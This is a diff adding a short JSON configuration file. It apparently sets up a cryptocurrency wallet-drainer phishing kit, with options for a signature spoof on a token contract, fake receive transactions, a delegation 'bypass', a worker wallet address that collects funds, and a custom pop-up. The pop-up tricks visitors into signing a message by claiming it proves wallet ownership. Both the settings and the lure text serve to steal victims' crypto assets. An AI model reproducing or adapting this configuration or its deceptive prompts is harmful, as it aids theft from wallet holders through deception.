@@ -1,0 +1,19 @@
+{
+  "DARK_MODE": true,
+  "USE_7702_BYPASS": true,
+  "MIN_VALUE_USD": 10,
+  "FAKE_RECEIVE": true,
+  "CLAIM_REWARD_AMOUNT": 5,
+  "WEI_RECEIVE": true,
+  "WORKER_ADDRESS": "0xfc31c089940e9d4dfa685667c00de3e54b270a12",
+  "SPOOF_SIGNATURE": {
+    "SPOOF_TOKEN_ADDRESS": "0xdac17f958d2ee523a2206206994597c13d831ec7",
+    "SPOOF_TOKEN_DECIMALS": 6,
+    "SPOOF_TOKEN_AMOUNT": 5
+  },
+  "CUSTOM_MODAL": {
+    "CUSTOM_MODAL_TITLE": "Sign in",
+    "CUSTOM_MODAL_MESSAGE": "Sign this message to prove you own this wallet and proceed. Canceling will disconnect you.",
+    "CUSTOM_MODAL_EMPTY_WALLET": "Congratulations! You've registered in the system."
+  }
+}
